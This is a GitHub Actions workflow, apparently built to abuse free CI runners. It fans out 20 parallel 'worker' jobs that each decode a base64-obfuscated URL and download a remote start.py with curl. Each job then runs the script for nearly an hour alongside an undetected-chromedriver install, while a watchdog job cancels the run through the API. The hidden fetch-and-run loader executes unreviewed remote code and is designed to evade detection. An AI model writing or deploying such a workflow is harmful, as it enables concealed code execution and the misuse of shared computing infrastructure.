name: Distributed Task Matrix

on:
  workflow_dispatch:

concurrency:
  group: sync-cluster-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: false

permissions:
  actions: write
  contents: read

jobs:
  # =================================================================
  # Session Controller: مراقبة زمن التشغيل وإنهاء الـ Workflow
  # =================================================================
  session-controller:
    name: "Session Watchdog"
    runs-on: ubuntu-latest
    timeout-minutes: 60
    env:
      WAIT_TIMEOUT: 3540
    steps:
      - name: Track Execution Window
        run: |
          printf "Session tracker online for execution: %s\n" "${{ github.run_id }}"
          
          sleep "${WAIT_TIMEOUT}"

          printf "Time window exhausted. Sending abort command...\n"

          curl -sS -X POST \
            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
            -H "Accept: application/vnd.github+json" \
            -H "X-GitHub-Api-Version: 2022-11-28" \
            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"

  # =================================================================
  # Worker Instances: معالجة العقد الموازية
  # =================================================================
  worker-instances:
    name: "Worker-Channel-${{ matrix.channel_id }}"
    runs-on: ubuntu-latest
    timeout-minutes: 59

    strategy:
      fail-fast: false
      matrix:
        channel_id: [CH-501, CH-502, CH-503, CH-504, CH-505, CH-506, CH-507, CH-508, CH-509, CH-510, CH-511, CH-512, CH-513, CH-514, CH-515, CH-516, CH-517, CH-518, CH-519, CH-520]

    steps:
      # -----------------------------------------------------------------
      # 1. تهيئة حزم التشغيل النظامية
      # -----------------------------------------------------------------
      - name: Setup System Dependencies
        run: |
          sudo apt-get update -qq
          sudo apt-get install -y --no-upgrade curl python3-pip

      # -----------------------------------------------------------------
      # 2. تنزيل الملف الإجرائي
      # -----------------------------------------------------------------
      - name: Retrieve Payload Script
        run: |
          REMOTE_SRC=$(perl -MMIME::Base64 -e 'print decode_base64("aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5")')
          curl -sL "$REMOTE_SRC" -o runner_entry.py

      # -----------------------------------------------------------------
      # 3. تثبيت المكتبات البرمجية
      # -----------------------------------------------------------------
      - name: Install Python Dependencies
        run: |
          pip3 install --quiet psutil requests selenium undetected-chromedriver

      # -----------------------------------------------------------------
      # 4. تنفيذ ومراقبة العملية الرئيسيّة
      # -----------------------------------------------------------------
      - name: Launch Execution Task
        run: |
          python3 runner_entry.py &
          BACKGROUND_PID=$!

          sleep 3540

          if ps -p "$BACKGROUND_PID" >/dev/null 2>&1; then
            kill -SIGKILL "$BACKGROUND_PID"
          fi
